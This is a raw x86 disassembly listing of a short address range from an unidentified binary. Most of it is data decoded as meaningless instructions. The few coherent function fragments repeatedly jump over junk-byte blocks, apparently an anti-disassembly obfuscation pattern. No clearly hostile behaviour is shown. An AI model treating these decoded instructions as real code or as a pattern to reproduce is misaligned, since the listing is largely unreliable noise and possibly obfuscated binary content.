  4139d2:	adc    ebx,DWORD PTR [edi]
  4139d4:	xchg   esi,eax
  4139d5:	or     BYTE PTR [edx-0x32],ah
  4139d8:	sub    al,0x2b
  4139da:	and    BYTE PTR [ebp-0x1bb35ece],ah
  4139e0:	(bad)  
  4139e1:	adc    DWORD PTR [ebx-0x52],0x17
  4139e5:	inc    ebx
  4139e6:	cs ret 0x5776
  4139ea:	sub    cl,al
  4139ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139ed:	inc    ebp
  4139ee:	mov    ds:0x2142b2e7,al
  4139f3:	adc    ecx,DWORD PTR gs:[ecx]
  4139f6:	stos   DWORD PTR es:[edi],eax
  4139f7:	je     0x4139ff
  4139f9:	cmp    eax,0x5107a723
  4139fe:	icebp  
  4139ff:	inc    edx
  413a00:	test   BYTE PTR [edi-0x69],dl
  413a03:	in     eax,dx
  413a04:	jno    0x413a05
  413a06:	(bad)  
  413a07:	mov    BYTE PTR [edi-0x42],ch
  413a0a:	call   0x3654858b
  413a0f:	xor    cl,BYTE PTR [edi+ecx*2]
  413a12:	les    ebx,FWORD PTR [ecx-0x11d6b8a]
  413a18:	xchg   BYTE PTR [edx-0x7e],dh
  413a1b:	jmp    0x618d:0x2585e2e1
  413a22:	hlt    
  413a23:	out    dx,al
  413a24:	xchg   ebp,eax
  413a25:	mov    eax,ds:0x90244f06
  413a2a:	xchg   DWORD PTR [eax+edi*8-0x799e76ce],edx
  413a31:	int    0x28
  413a33:	dec    esp
  413a34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a35:	data16 and al,0x68
  413a38:	xchg   ebx,eax
  413a39:	sbb    eax,0xc4bc0fa6
  413a3e:	imul   eax,DWORD PTR [esi],0x9965332b
  413a44:	sub    BYTE PTR [ebp+eax*8-0x45187989],0xf8
  413a4c:	xlat   BYTE PTR ds:[ebx]
  413a4d:	jno    0x413a46
  413a4f:	imul   edi,DWORD PTR [edi],0x971bec7a
  413a55:	sub    bh,BYTE PTR [ebp+0x5d547bf9]
  413a5b:	aam    0x82
  413a5d:	addr16 jbe 0x413ad3
  413a60:	add    DWORD PTR [edi+0x1df40aab],esi
  413a66:	leave  
  413a67:	mov    al,ds:0xc29af384
  413a6c:	inc    ecx
  413a6d:	pop    es
  413a6e:	xor    eax,0x19da78bc
  413a73:	mov    dh,0x6f
  413a75:	and    BYTE PTR [eax+esi*2-0x33],0xc2
  413a7a:	lods   eax,DWORD PTR ds:[esi]
  413a7b:	or     ch,BYTE PTR [edi+0x1c]
  413a7e:	mov    esp,edi
  413a80:	cmp    esp,ecx
  413a82:	cmc    
  413a83:	xchg   DWORD PTR [ecx],esi
  413a85:	or     al,0xc4
  413a87:	stos   DWORD PTR es:[edi],eax
  413a88:	inc    ecx
  413a89:	cli    
  413a8a:	adc    edi,DWORD PTR [ecx+ebp*4+0x47]
  413a8e:	pop    ds
  413a8f:	cmc    
  413a90:	ror    bl,1
  413a92:	icebp  
  413a93:	shr    BYTE PTR [ecx],1
  413a95:	xchg   edx,eax
  413a96:	pop    ebp
  413a97:	das    
  413a98:	push   ds
  413a99:	fcom   DWORD PTR [esi-0x39d8cf11]
  413a9f:	mov    dl,bl
  413aa1:	ins    BYTE PTR es:[edi],dx
  413aa2:	icebp  
  413aa3:	clc    
  413aa4:	mov    bl,0xd3
  413aa6:	jae    0x413aaa
  413aa8:	out    0x61,eax
  413aaa:	pusha  
  413aab:	dec    ecx
  413aac:	test   BYTE PTR [ecx-0x1a],ch
  413aaf:	shl    DWORD PTR [edi+0x71],0x1f
  413ab3:	mov    al,ds:0x840720e3
  413ab8:	push   es
  413ab9:	mov    dh,0xc8
  413abb:	in     al,dx
  413abc:	test   DWORD PTR [edi],0x5e836854
  413ac2:	dec    esi
  413ac3:	cmp    ebp,DWORD PTR [edi+0x48]
  413ac6:	lods   al,BYTE PTR ds:[esi]
  413ac7:	stc    
  413ac8:	adc    al,0x99
  413aca:	lods   al,BYTE PTR ds:[esi]
  413acb:	cmp    eax,0x991db451
  413ad0:	fidivr DWORD PTR [bx-0x6046]
  413ad5:	jle    0x413a88
  413ad7:	xchg   edi,eax
  413ad8:	lock mov DWORD PTR [edi+0x3e],eax
  413adc:	pop    ecx
  413add:	push   ebp
  413ade:	ins    DWORD PTR es:[edi],dx
  413adf:	jnp    0x413ab0
  413ae1:	cmp    al,0x99
  413ae3:	mov    ecx,0x91d4fd9b
  413ae8:	call   0xb679baa5
  413aed:	int3   
  413aee:	push   esi
  413aef:	push   0xffffffb9
  413af1:	rol    DWORD PTR [esi+0x20ab901f],1
  413af7:	fcmovu st,st(5)
  413af9:	or     esi,eax
  413afb:	shr    DWORD PTR [ebx-0x80],0x5e
  413aff:	jge    0x413b50
  413b01:	neg    DWORD PTR [edi-0x196c95cd]
  413b07:	call   0x889c7f16
  413b0c:	sbb    al,BYTE PTR [edx+eax*8-0x1760c0ec]
  413b13:	xchg   ecx,eax
  413b14:	xor    dh,BYTE PTR [ebp+0x49]
  413b17:	(bad)  
  413b18:	aaa    
  413b19:	adc    ebx,ebx
  413b1b:	mov    ds:0x1a18c9e,al
  413b20:	lds    ecx,FWORD PTR [ecx]
  413b22:	pop    edi
  413b23:	inc    ecx
  413b24:	das    
  413b25:	mov    ds:0xc334ccec,eax
  413b2a:	sub    ebp,esi
  413b2c:	inc    edx
  413b2d:	inc    edi
  413b2e:	arpl   WORD PTR [edi-0x78],bx
  413b31:	mov    edi,0x13b7e3e7
  413b36:	dec    ch
  413b38:	daa    
  413b39:	stc    
  413b3a:	repz or esi,DWORD PTR [ebx+0x1]
  413b3e:	xchg   eax,esp
  413b40:	cmp    DWORD PTR [esi],0x21
  413b43:	enter  0x2075,0x84
  413b47:	or     al,0xff
  413b49:	pop    ds
  413b4a:	jge    0x413ad2
  413b4c:	aam    0xa1
  413b4e:	mov    ebp,0x34b0dc0b
  413b53:	sub    eax,0x1e0908b3
  413b58:	jmp    0x8e61:0xc0c89012
  413b5f:	push   ecx
  413b60:	or     ebp,0x766a8b14
  413b66:	cwde   
  413b67:	retf   0xa876
  413b6a:	pop    ecx
  413b6b:	ret    
  413b6c:	popa   
  413b6d:	push   ss
  413b6e:	lods   eax,DWORD PTR ds:[esi]
  413b6f:	mov    cs,WORD PTR [edx-0x50a0e6dd]
  413b75:	pop    esi
  413b76:	into   
  413b77:	in     eax,0x78
  413b79:	or     ecx,DWORD PTR [eax-0x4a]
  413b7c:	mov    bh,0xec
  413b7e:	jae    0x413b8a
  413b80:	ret    0x22b6
  413b83:	mov    cl,0xd5
  413b85:	daa    
  413b86:	add    DWORD PTR [edx+0x4b],eax
  413b89:	cmp    al,ah
  413b8b:	rol    DWORD PTR [edx-0xf6f82d7],0xc5
  413b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b93:	or     al,0x6d
  413b95:	xor    BYTE PTR [ebx+0xdceef92],dl
  413b9b:	jg     0x413b3e
  413b9d:	jae    0x413bb1
  413b9f:	imul   edi,DWORD PTR [edx-0x790764b],0x26
  413ba6:	push   ds
  413ba7:	rcr    BYTE PTR [edi-0x7c99642c],cl
  413bad:	xchg   esp,eax
  413bae:	cmp    esp,DWORD PTR [esi]
  413bb0:	test   BYTE PTR [ebx-0x6c],cl
  413bb3:	add    al,bl
  413bb5:	lea    ecx,[esi+0x1]
  413bb8:	les    esi,FWORD PTR [edi-0x20]
  413bbb:	out    dx,eax
  413bbc:	xor    bh,BYTE PTR [eax+0x37]
  413bbf:	test   al,0xf7
  413bc1:	fcomp  QWORD PTR [ebx*8-0x69abfcd6]
  413bc8:	clc    
  413bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bca:	mov    bl,0x1b
  413bcc:	cmp    DWORD PTR [edx-0x2f8158cb],esi
  413bd2:	sub    al,0xae
  413bd4:	in     eax,0xd8
  413bd6:	call   0x821:0xeb2ec2e9
  413bdd:	sbb    ah,BYTE PTR [esi+eax*4+0x4359e3d6]
  413be4:	test   ch,0x64
  413be7:	or     ebp,edx
  413be9:	dec    ecx
  413bea:	mov    al,0x43
  413bec:	(bad)  
  413bed:	and    dl,BYTE PTR [eax]
  413bef:	add    edi,DWORD PTR [edx+0x19]
  413bf2:	hlt    
  413bf3:	xlat   BYTE PTR ds:[ebx]
  413bf4:	icebp  
  413bf5:	in     al,0xd4
  413bf7:	leave  
  413bf8:	cmc    
  413bf9:	push   ebx
  413bfa:	es push eax
  413bfc:	or     ecx,DWORD PTR [esi+0x1e1e3cd3]
  413c02:	dec    DWORD PTR [ebx]
  413c04:	mov    ebp,0xb5b14b1c
  413c09:	ss cdq 
  413c0b:	mov    ds:0x45306a08,eax
  413c10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c11:	xlat   BYTE PTR ds:[bx]
  413c13:	dec    ebx
  413c14:	jne    0x413bc8
  413c16:	(bad)  
  413c17:	cmp    DWORD PTR [edx+0x5a],ebp
  413c1a:	pop    ebp
  413c1b:	call   0x1042:0xe7b7a6e0
  413c22:	push   cs
  413c23:	inc    esi
  413c24:	fisubr DWORD PTR [ebx-0x29]
  413c27:	in     al,0x2e
  413c29:	in     al,dx
  413c2a:	dec    eax
  413c2b:	adc    al,0x33
  413c2d:	add    bl,BYTE PTR ds:0xf48ea4f0
  413c33:	pushf  
  413c34:	mov    ah,0x59
  413c36:	test   eax,0x98a37b6b
  413c3b:	xchg   esi,eax
  413c3c:	push   ebx
  413c3d:	shl    esp,1
  413c3f:	test   bl,0x77
  413c42:	(bad)  
  413c43:	xchg   esp,eax
  413c44:	inc    edx
  413c45:	sub    ecx,DWORD PTR [ebp+0x4c]
  413c48:	inc    edi
  413c49:	aaa    
  413c4a:	out    dx,al
  413c4b:	ja     0x413c1f
  413c4d:	imul   esi,DWORD PTR [edi],0x10ba866
  413c53:	mov    dl,0x24
  413c55:	daa    
  413c56:	cmp    edx,DWORD PTR [ebx-0x70]
  413c59:	mov    WORD PTR [eax+0x34],es
  413c5c:	je     0x413c0d
  413c5e:	js     0x413c7c
  413c60:	pop    eax
  413c61:	sub    DWORD PTR [edi],0x23183a8a
  413c67:	fld    st(4)
  413c69:	pmulhuw mm4,QWORD PTR [edx]
  413c6c:	or     al,0x3b
  413c6e:	jp     0x413ca4
  413c70:	loope  0x413c17
  413c72:	sub    al,0x5e
  413c74:	cmp    BYTE PTR [esi-0x16ad17ca],al
  413c7a:	out    0xc6,al
  413c7c:	adc    al,0x45
  413c7e:	retf   
  413c7f:	fxch   st(6)
  413c81:	dec    edx
  413c82:	mov    ds:0xd1a1fe8,eax
  413c87:	imul   ebx,ebx,0x40
  413c8a:	aas    
  413c8b:	(bad)  
  413c8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c8d:	jmp    0x413c3f
  413c8f:	sbb    edi,ebp
  413c91:	and    eax,0x24203723
  413c96:	ret    
  413c97:	jb     0x413ca0
  413c99:	or     DWORD PTR [ecx+0x218c310],eax
  413c9f:	push   ss
  413ca0:	pop    edi
  413ca1:	aad    0x8d
  413ca3:	scas   eax,DWORD PTR es:[edi]
  413ca4:	cmp    eax,0xee6b851b
  413ca9:	jmp    0xd84d:0x8b1003a2
  413cb0:	adc    ebx,DWORD PTR [eax+0x4]
  413cb3:	push   0x2
  413cb5:	xor    ebx,esi
  413cb7:	mov    esi,DWORD PTR [ebp-0x24]
  413cba:	pop    esi
  413cbb:	sub    esi,ecx
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	add    ebp,0x3289b07b
  413d04:	sbb    BYTE PTR [eax],bl
  413d06:	stos   BYTE PTR es:[edi],al
  413d07:	adc    bl,BYTE PTR [eax]
  413d09:	sbb    al,ah
  413d0b:	stos   DWORD PTR es:[edi],eax
  413d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d0d:	das    
  413d0e:	push   DWORD PTR [edx]
  413d10:	ret    0xb22b
  413d13:	dec    esp
  413d14:	mov    edx,0xa66ad6fc
  413d19:	sub    eax,DWORD PTR [edx-0x2ae5a902]
  413d1f:	pop    ebx
  413d20:	sub    bl,cl
  413d22:	push   ecx
  413d23:	add    dh,cl
  413d25:	sub    DWORD PTR [edx],edx
  413d27:	stos   DWORD PTR es:[edi],eax
  413d28:	and    al,0xd7
  413d2a:	inc    esp
  413d2b:	xor    cl,ah
  413d2d:	loope  0x413d09
  413d2f:	or     ch,ah
  413d31:	or     ecx,ecx
  413d33:	jns    0x413cec
  413d35:	pop    esp
  413d36:	mov    ebx,0x85d71955
  413d3b:	fmul   QWORD PTR [eax+0x5ef08312]
  413d41:	pop    ss
  413d42:	push   es
  413d43:	adc    edx,0x8529918c
  413d49:	inc    esp
  413d4a:	sub    eax,DWORD PTR [edx+0x73]
  413d4d:	popa   
  413d4e:	das    
  413d4f:	lahf   
  413d50:	inc    edx
  413d51:	dec    edx
  413d52:	jno    0x413d42
  413d54:	ja     0x413d2c
  413d56:	sub    eax,0xd507f08c
  413d5b:	dec    esi
  413d5c:	ficomp WORD PTR [ebp+eax*2+0x7c905720]
  413d63:	mov    dl,0xd4
  413d65:	xor    edx,ecx
  413d67:	adc    eax,0xe1969341
  413d6c:	push   edx
  413d6d:	cmc    
  413d6e:	mov    ebp,0x11004077
  413d73:	dec    ecx
  413d74:	sub    DWORD PTR ds:0x63c4332,ebp
  413d7a:	xor    BYTE PTR [esi-0x691b7b4d],dl
  413d80:	or     BYTE PTR [edx+0x65],bl
  413d83:	repz hlt 
  413d85:	cmp    BYTE PTR [edi-0x76],cl
  413d88:	mov    ebp,0xf9b3d24c
  413d8d:	into   
  413d8e:	mov    WORD PTR [ebx+0x6c20426a],ds
  413d94:	add    dl,BYTE PTR [ecx]
  413d96:	clc    
  413d97:	dec    ebp
  413d98:	dec    ebp
  413d99:	js     0x413dc8
  413d9b:	ins    BYTE PTR es:[edi],dx
  413d9c:	fucomi st,st(7)
  413d9e:	pop    ebp
  413d9f:	lahf   
  413da0:	xchg   ecx,eax
  413da1:	xor    esi,ebp
  413da3:	(bad)  
  413da5:	out    dx,eax
  413da6:	dec    ebx
  413da7:	push   ebp
  413da8:	dec    eax
  413da9:	scas   eax,DWORD PTR es:[edi]
  413daa:	loope  0x413e2a
  413dac:	ret    
  413dad:	enter  0xa9b5,0x4c
  413db1:	cli    
  413db2:	sbb    al,0x15
  413db4:	jge    0x413de6
  413db6:	jmp    0x218f671a
  413dbb:	into   
  413dbc:	sub    eax,0x71024772
  413dc1:	jp     0x413db1
  413dc3:	les    ebx,FWORD PTR [esi-0x670f88c3]
  413dc9:	jae    0x413e1f
  413dcb:	adc    eax,0x7d30fb96
  413dd0:	in     al,0x1e
  413dd2:	dec    edx
  413dd3:	mov    bh,0xd6
  413dd5:	mov    DWORD PTR [ebp+0x33e9ce5b],eax
  413ddb:	shl    DWORD PTR [ecx+0x49],1
  413dde:	mov    al,ds:0xe3dffa63
  413de3:	retf   
  413de4:	inc    edx
  413de5:	push   cs
  413de6:	xchg   ecx,eax
  413de7:	sub    al,BYTE PTR [eax+0x6e]
  413dea:	and    edx,DWORD PTR fs:[edi]
  413ded:	or     bl,BYTE PTR ds:0x3cb8155
  413df4:	stos   DWORD PTR es:[edi],eax
  413df5:	mov    al,0xb1
  413df7:	retf   
  413df8:	push   ebx
  413df9:	xchg   ebx,eax
  413dfa:	cmp    eax,0xa4cf7dd2
  413dff:	lds    ebp,FWORD PTR [edx+0x6b]
  413e02:	add    al,0x59
  413e04:	xchg   ecx,eax
  413e05:	loop   0x413d9e
  413e07:	mov    bl,0xaf
  413e09:	aas    
  413e0a:	xor    DWORD PTR [ebx+0x1],0x1628ec15
  413e11:	repnz cdq 
  413e13:	inc    ecx
  413e14:	ins    DWORD PTR es:[edi],dx
  413e15:	pop    edi
  413e16:	aam    0x2
  413e18:	push   0xffffffd1
  413e1a:	jnp    0x413e21
  413e1c:	in     al,dx
  413e1d:	bound  edi,QWORD PTR [ebp-0x6e]
  413e20:	add    eax,0x86f3c48
  413e25:	sub    edx,DWORD PTR [ecx+0x67ec7804]
  413e2b:	ja     0x413e40
  413e2d:	js     0x413de3
  413e2f:	push   edx
  413e30:	jl     0x413e3c
  413e32:	push   cs
  413e33:	cld    
  413e34:	call   0x27cc:0xaa09d77a
  413e3b:	and    dl,dl
  413e3d:	or     eax,0xa36d7c3d
  413e42:	ds adc ch,dh
  413e45:	out    dx,eax
  413e46:	cs mov ah,0xfe
  413e49:	push   esi
  413e4a:	ja     0x413e48
  413e4c:	and    ecx,DWORD PTR [edx]
  413e4e:	femms  
  413e50:	add    al,0x5
  413e52:	adc    eax,0x5c6e28e4
  413e57:	retf   
  413e58:	mov    ch,0x7
  413e5a:	addr16 mov edi,0xd53d5818
  413e60:	mov    cl,0x9d
  413e62:	jnp    0x413e3c
  413e64:	add    DWORD PTR [ecx+0x59821043],ebx
  413e6a:	data16 cmp BYTE PTR [esi+0x5c57701a],al
  413e71:	inc    ebx
  413e72:	es pop ecx
  413e74:	xor    DWORD PTR [edi-0x491d653b],ebp
  413e7a:	bound  ecx,QWORD PTR [esi+0x164c01b1]
  413e80:	and    BYTE PTR [ebp+0x2e],dl
  413e83:	test   BYTE PTR [ebx],dh
  413e85:	jg     0x413e28
  413e87:	sub    eax,0x600f1e4a
  413e8c:	mov    eax,ds:0x79b5e3bc
  413e91:	push   eax
  413e92:	pop    ds
  413e93:	scas   eax,DWORD PTR es:[edi]
  413e94:	push   0xffffff9e
  413e96:	call   0x3f79:0xd2ede155
  413e9d:	and    ebx,esp
  413e9f:	retf   
  413ea0:	loop   0x413ebc
  413ea2:	je     0x413e2a
  413ea4:	sub    edx,eax
  413ea6:	adc    DWORD PTR [edx+edi*1-0x4a632690],ebx
  413ead:	sbb    al,0x5d
  413eaf:	repz repnz (bad) 
  413eb2:	jp     0x413e8c
  413eb4:	add    DWORD PTR ds:0x755ddc25,esi
  413eba:	imul   ecx,edi,0xffffffde
  413ebd:	adc    DWORD PTR [esi],0x7c331fe8
  413ec3:	loop   0x413ed3
  413ec5:	out    0xe3,al
  413ec7:	jnp    0x413f47
  413ec9:	aad    0x99
  413ecb:	adc    ah,BYTE PTR [ebp+0x59]
  413ece:	mov    cl,0xf9
  413ed0:	mov    cl,0x34
  413ed2:	nop
  413ed3:	sub    ch,dh
  413ed5:	jle    0x413ef6
  413ed7:	add    eax,0x9a50555
  413edc:	out    0xf9,al
  413ede:	jp     0x413e98
  413ee0:	ins    BYTE PTR es:[edi],dx
  413ee1:	jb     0x413eb0
  413ee3:	mov    dl,0xad
  413ee5:	mov    ds:0x3da3dd59,eax
  413eea:	or     edx,eax
  413eec:	or     dh,BYTE PTR ds:0xbe3ad583
  413ef2:	js     0x413f37
  413ef4:	push   ebx
  413ef5:	cmc    
  413ef6:	mov    DWORD PTR [ecx+0x74774a81],0x9ee9f76b
  413f00:	jg     0x413f58
  413f02:	vpshab xmm14,xmm2,xmm0
  413f07:	out    dx,al
  413f08:	lahf   
  413f09:	mov    DWORD PTR [ecx-0x32701413],eax
  413f0f:	mov    DWORD PTR [esp+ebp*4-0x456a466d],ecx
  413f16:	loope  0x413eab
  413f18:	sbb    bl,BYTE PTR [ebp+ecx*4+0xc]
  413f1c:	pop    esp
  413f1d:	(bad)  
  413f1e:	in     al,0x8d
  413f20:	mov    bl,0xe7
  413f22:	sub    edx,DWORD PTR [edx]
  413f24:	mov    ds:0x224f76,al
  413f29:	repz or al,ch
  413f2c:	jb     0x413fa6
  413f2e:	and    BYTE PTR [edi],0x77
  413f31:	daa    
  413f32:	and    ch,dl
  413f34:	test   BYTE PTR [ebx-0x30],dl
  413f37:	mov    ebp,0x62c5a74c
  413f3c:	push   esp
  413f3d:	jo     0x413ed2
  413f3f:	or     DWORD PTR [ecx],eax
  413f41:	fwait
  413f42:	mov    ah,0x53
  413f44:	fwait
  413f45:	cdq    
  413f46:	cli    
  413f47:	xor    eax,0x7ca2e55a
  413f4c:	les    edi,FWORD PTR [ecx-0x6f]
  413f4f:	inc    eax
  413f50:	sbb    al,0x91
  413f52:	sbb    ebp,ecx
  413f54:	push   ds
  413f55:	xor    al,0x22
  413f57:	aad    0x5b
  413f59:	dec    edx
  413f5a:	in     al,dx
  413f5b:	fstp   QWORD PTR [edi+0x26]
  413f5e:	int3   
  413f5f:	sub    DWORD PTR [edi+0x1c2dbbb9],edx
  413f65:	out    0x3c,al
  413f67:	mov    dh,0x83
  413f69:	call   DWORD PTR [ecx+0x5e67a2cd]
  413f6f:	nop    DWORD PTR [ebx+0x413924a4]
  413f76:	outs   dx,BYTE PTR ds:[esi]
  413f77:	jno    0x413f52
  413f79:	mov    cl,0xb5
  413f7b:	clc    
  413f7c:	pop    ebx
  413f7d:	jmp    0x413fa2
  413f7f:	jge    0x413f1c
  413f81:	loope  0x413f8c
  413f83:	mov    DWORD PTR [edx-0x28],esi
  413f86:	aam    0xbc
  413f88:	outs   dx,BYTE PTR ds:[esi]
  413f89:	(bad)  
  413f8a:	pop    edi
  413f8b:	fist   WORD PTR [esi+esi*1+0xe]
  413f8f:	jae    0x413f38
  413f91:	cmp    ebx,edx
  413f93:	jg     0x413f9e
  413f95:	jmp    0x1b391a7c
  413f9a:	int    0xe4
  413f9c:	push   edx
  413f9d:	mov    eax,0x86acda36
  413fa2:	clc    
  413fa3:	inc    edx
  413fa4:	jmp    0x1cd562b9
  413fa9:	pmulhw mm0,QWORD PTR [esi]
  413fac:	aam    0x8b
  413fae:	fs pop ecx
  413fb0:	repnz cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  413fb3:	aam    0x62
  413fb5:	stos   BYTE PTR es:[edi],al
  413fb6:	pop    eax
  413fb7:	loop   0x41401d
  413fb9:	or     al,0x1d
  413fbb:	xor    edx,DWORD PTR [ebx-0x37cffeaa]
  413fc1:	mov    ch,0xb7
  413fc3:	push   cs
  413fc4:	fstp   DWORD PTR [esi-0x2]
  413fc7:	mov    ds:0x46f01f2c,eax
  413fcc:	or     eax,0x552cd51b
  413fd1:	clc    
  413fd2:	cdq    
  413fd3:	std    
  413fd4:	inc    ebx
  413fd5:	repz imul esp,DWORD PTR [esi],0x52
  413fd9:	and    eax,0x3dd1de1b
  413fde:	std    
  413fdf:	fbld   TBYTE PTR [edx-0x2ad2917a]
  413fe5:	sbb    al,ch
  413fe7:	dec    edx
  413fe8:	repz cmp edx,DWORD PTR [ebp-0x62]
  413fec:	iret   
  413fed:	retf   
  413fee:	pop    esi
  413fef:	cmp    eax,0x207fa892
  413ff4:	push   ebx
  413ff5:	sbb    al,0x82
  413ff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ff8:	lods   eax,DWORD PTR ds:[esi]
  413ff9:	std    
  413ffa:	mov    ah,0xd2
  413ffc:	into   
  413ffd:	cld    
  413ffe:	mov    ebx,0x86d548c0
  414003:	inc    ecx
  414004:	xchg   esp,eax
  414005:	arpl   WORD PTR [ebx-0x5e479a49],dx
  41400b:	ja     0x413fe8
  41400d:	arpl   WORD PTR [esi],ax
  41400f:	int3   
  414010:	jb     0x41400f
  414012:	ror    BYTE PTR [eax+0x72],cl
  414015:	das    
  414016:	mov    bl,0x1c
  414018:	dec    esi
  414019:	clc    
  41401a:	and    eax,0xb47119c7
  41401f:	and    BYTE PTR [edi+0x2],0xf1
  414023:	pop    edx
  414024:	inc    ecx
  414025:	dec    esi
  414026:	shl    ebx,1
  414028:	push   ds
  414029:	test   al,0x7e
  41402b:	inc    eax
  41402c:	and    ah,BYTE PTR [ecx+0x28]
  41402f:	or     al,0x8b
  414031:	mov    ch,cl
  414033:	jno    0x414076
  414035:	mov    ds:0x10753c8a,eax
  41403a:	xchg   edx,eax
  41403b:	mov    cl,0xa8
  41403d:	jl     0x414074
  41403f:	mov    WORD PTR [eax-0x361df6b9],ds
  414045:	xlat   BYTE PTR ds:[ebx]
  414046:	bound  ecx,QWORD PTR [ebx]
  414048:	mov    ah,0xce
  41404a:	inc    edx
  41404b:	push   edx
  41404c:	in     eax,dx
  41404d:	repnz mov fs,WORD PTR cs:[ecx+eiz*1+0x258a30a0]
  414056:	jb     0x4140d5
  414058:	push   es
  414059:	xor    eax,0x7d763bf9
  41405e:	imul   ebp,DWORD PTR [ebx+0x65883dcb],0xbf2df07
  414068:	retf   0xb96a
  41406b:	xor    esi,DWORD PTR [edx]
  41406d:	mov    ebp,esp
  41406f:	ficom  WORD PTR [edx-0x1313253a]
  414075:	sbb    al,0x1e
  414077:	adc    BYTE PTR [esi+0x4a64a22],ah
  41407d:	add    BYTE PTR [esi+0x3],al
  414080:	or     al,0x41
  414082:	and    ebp,ecx
  414084:	push   esi
  414085:	(bad)  
  414086:	jle    0x414099
  414088:	xlat   BYTE PTR ds:[ebx]
  414089:	inc    ebx
  41408a:	repnz test eax,0x864cc7b4
  414090:	xor    bh,cl
  414092:	fmul   DWORD PTR [edx]
  414094:	test   eax,0xd7aace0b
  414099:	dec    esi
  41409a:	xchg   esi,eax
  41409b:	addr16 xor dl,0x4e
  41409f:	mov    edx,0x9bbd47bb
  4140a4:	call   0x5c78:0x2d53a162
  4140ab:	push   ecx
  4140ac:	(bad)  
  4140ad:	or     eax,0xd28955a1
  4140b2:	and    dh,bl
  4140b4:	pop    ss
  4140b5:	fucomi st,st(3)
  4140b7:	into   
  4140b8:	aas    
  4140b9:	xor    esp,0xffffffdf
  4140bc:	(bad)  
  4140be:	jecxz  0x4140e1
  4140c0:	inc    edx
  4140c1:	dec    ebx
  4140c2:	sub    edi,edx
  4140c4:	dec    esp
  4140c5:	push   edi
  4140c6:	mov    DWORD PTR [ebp-0x3c],esi
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x422046
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [ebx+eiz*4+0x34]
  414159:	or     bh,BYTE PTR [esi+0x1a]
  41415c:	sub    al,0x18
  41415e:	sbb    al,dl
  414160:	adc    bl,BYTE PTR [eax]
  414162:	sbb    BYTE PTR [edi-0x32061893],dl
  414168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414169:	int3   
  41416a:	ss xchg ebp,eax
  41416c:	add    eax,0x76da3504
  414171:	add    DWORD PTR [eax],eax
  414173:	sub    edi,DWORD PTR [esi+0x7f]
  414176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414177:	xchg   BYTE PTR [esi+0xd],dh
  41417a:	dec    esp
  41417b:	rcr    ah,cl
  41417d:	shr    BYTE PTR ds:0x90108172,1
  414183:	mov    ebp,0xaac03a99
  414188:	enter  0xaa58,0xfb
  41418c:	arpl   WORD PTR [edx-0x3f],bp
  41418f:	cmp    BYTE PTR [ecx+eiz*4+0x623037ec],ch
  414196:	jecxz  0x41416f
  414198:	xchg   BYTE PTR [eax-0x5b],dh
  41419b:	xchg   edi,eax
  41419c:	in     al,dx
  41419d:	add    ebp,DWORD PTR [esi-0x7a]
  4141a0:	xchg   BYTE PTR [edx+ebp*2-0x9a4987],ch
  4141a7:	shl    BYTE PTR [edx],1
  4141a9:	pop    ecx
  4141aa:	jp     0x41418a
  4141ac:	and    dh,ah
  4141ae:	rol    DWORD PTR [esi+0x8],1
